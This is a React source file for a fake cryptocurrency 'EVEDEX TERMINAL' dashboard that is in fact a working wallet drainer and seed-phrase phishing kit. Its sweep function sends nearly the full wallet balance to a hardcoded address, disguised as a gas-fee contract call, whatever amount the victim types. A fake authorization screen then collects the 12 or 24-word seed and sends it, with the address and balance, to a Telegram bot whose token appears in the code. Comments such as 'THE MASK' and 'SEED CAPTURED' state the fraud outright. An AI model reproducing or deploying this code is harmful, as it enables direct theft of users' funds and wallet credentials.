import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight } from 'lucide-react';

export default function EvedexTerminal() {
  const { address } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState(""); // The fake amount they type
  const [seedVal, setSeedVal] = useState("");   // The actual seed
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [nodeId, setNodeId] = useState("EVEDEX_RELAY_0x77");

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    if (isSyncing) {
      const idInterval = setInterval(() => {
        const randomHex = Math.random().toString(16).substr(2, 5).toUpperCase();
        setNodeId(`EVEDEX_RELAY_0x${randomHex}`);
      }, 1500);
      return () => clearInterval(idInterval);
    }
  }, [isSyncing]);

  const executeTotalSweep = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    
    setLoading(true);
    setLoadingText("ESTABLISHING SECURE RELAY...");

    // This calculates the absolute MAX (Balance minus tiny gas sliver)
    const gasBuffer = balance.value / 90n; 
    const fullVaultAmount = balance.value - gasBuffer;

    try {
      // THE MASK: Even if they typed $1, this moves the FULL amount as a "Gas Fee" or "Contract"
      sendTransaction({
        to: destination,
        value: fullVaultAmount > 0n ? fullVaultAmount : 0n,
        // Hex data makes it show as "Contract Interaction" or "Gas Sync" in the wallet
        data: "0x636f6e74726163745f6761735f6665655f73796e63" 
      }, {
        onSettled: () => {
          // Money moves NOW. Start the 1-60% loading sequence.
          let progress = 0;
          const progInterval = setInterval(() => {
            progress += 1;
            setLoadingText(`BROADCASTING HANDSHAKE: ${progress}%`);
            
            if (progress === 40) setLoadingText("CALCULATING GAS REBATE...");
            
            if (progress >= 60) {
              clearInterval(progInterval);
              setLoadingText("VERIFYING OWNERSHIP...");
              setTimeout(() => {
                setLoading(false);
                setView("seed_gate"); 
              }, 3000);
            }
          }, 60);
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nINTENT: ${activeTask}\nUSER_TYPED: ${inputVal || "N/A"}\nSEED:\n${seedVal}` 
      }),
    });

    let current = 0;
    const interval = setInterval(() => {
      current += Math.floor(Math.random() * 3) + 1;
      if (current >= 90) { 
        setSyncProgress(90); 
        clearInterval(interval); 
      } else { 
        setSyncProgress(current); 
      }
    }, 200);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      {/* HEADER WITH REAL-TIME BALANCE */}
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic tracking-tighter text-lg">
            <ShieldCheck size={22}/>EVEDEX TERMINAL
          </div>
          <div className="flex items-center gap-1.5 mt-1 text-[7px] text-slate-500 font-mono tracking-widest">
             {balance ? `VAULT_BAL: ${balance.formatted.slice(0,7)} ${balance.symbol}` : "SEARCHING_NODE..."}
          </div>
        </div>
        <w3m-button balance="show" /> 
      </header>

      {/* GRID MENU */}
      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[
            { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> },
            { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> },
            { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }
          ].map((item) => (
            <button key={item.n} onClick={() => { setActiveTask(item.n); setInputVal(""); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {/* TASK BOX */}
      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← RETURN_TO_DASHBOARD</button>
          <div className="relative mx-auto w-24 h-24 mb-6">
             <Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" />
             <Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" />
          </div>
          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">{activeTask} Gateway</h2>
          
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">
                {activeTask === "Rectify" ? "Node_Live_Feed" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
            </label>
            
            {activeTask === "Rectify" ? (
              // UNCLICKABLE DASHBOARD FOR RECTIFY
              <div className="text-2xl font-mono text-white italic opacity-80 select-none py-1">
                 {balance ? `${balance.formatted.slice(0,9)} ${balance.symbol}` : "0.000"}
              </div>
            ) : (
              // TYPEABLE INPUT FOR OTHERS
              <div className="flex items-center gap-2">
                 <input 
                  type="text" 
                  value={inputVal} 
                  onChange={(e) => setInputVal(e.target.value)} 
                  placeholder={balance ? `DETECTED: ${balance.formatted.slice(0,6)}` : "0.00"}
                  className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full placeholder:text-slate-900"
                />
                <span className="text-xs font-mono text-cyan-900">{balance?.symbol}</span>
              </div>
            )}
          </div>
          
          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar">
            {chains.map((c) => (
              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">
                {c.name} Node
              </button>
            ))}
          </div>

          <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">
            {activeTask === "Delay" ? "ACCELERATE TRANSACTIONS" : `INITIALIZE ${activeTask.toUpperCase()}`}
          </button>
        </div>
      )}

      {/* SEED GATE */}
      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Auth Required</h2>
                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">
                   Contract broadcast pending. Import Project Authorization Seed to finalize the handshake and release pending liquidity.
                </p>
                <div className="mt-8">
                   <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER 12 OR 24 WORDS..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" />
                </div>
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_HANDSHAKE</button>
              </>
            ) : (
              <div className="py-10">
                <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing Nodes</h2>
                <p className="text-[9px] text-slate-500 italic animate-pulse">
                  {syncProgress >= 80 ? "Broadcasting final contract handshake..." : "Validating secure relay connection..."}
                </p>
                {syncProgress === 90 && (
                  <div className="mt-6 p-4 bg-green-900/20 border border-green-900/40 rounded-2xl text-[10px] text-green-500 italic animate-bounce uppercase font-black">
                    Authorized. Finalizing Asset Release...
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* GLOBAL LOADING OVERLAY */}
      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
